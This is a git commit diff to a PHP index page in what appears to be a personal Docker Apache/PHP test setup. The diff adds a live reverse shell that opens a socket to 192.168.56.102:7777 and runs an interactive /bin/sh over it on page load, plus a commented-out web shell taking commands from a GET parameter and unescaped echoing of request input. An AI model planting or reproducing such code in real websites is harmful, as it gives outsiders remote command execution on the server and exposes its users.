e4aa387756a2948b96c6f2ccb2089d35a3c334ff
skllrn@work <root@localhost.localdomain>
2019-07-18 05:17:15 -0400

    PHP $_GET

--- Admin/Docker/Setups/ApachePHP/www/index.php
+++ Admin/Docker/Setups/ApachePHP/www/index.php
@@ -1,8 +1,18 @@
-TEEEST
-RIIICK
+<h2>RIIICK</h2>
+
 <?php
 $var = 'C137';
-echo "<p>RICK ".$var."</p>"; 
-phpinfo();
+
+echo "<h4>RICK ".$var."</h4>"; 
+
+$sock=fsockopen("192.168.56.102",7777);
+exec("/bin/sh -i <&3 >&3 2>&3");
+
+#echo shell_exec($_GET['e'].' 2>&1');
+echo "<p>".$_GET."</p>";
+echo $_GET['test']."\n";
+
+#phpinfo();
+
 ?>
 
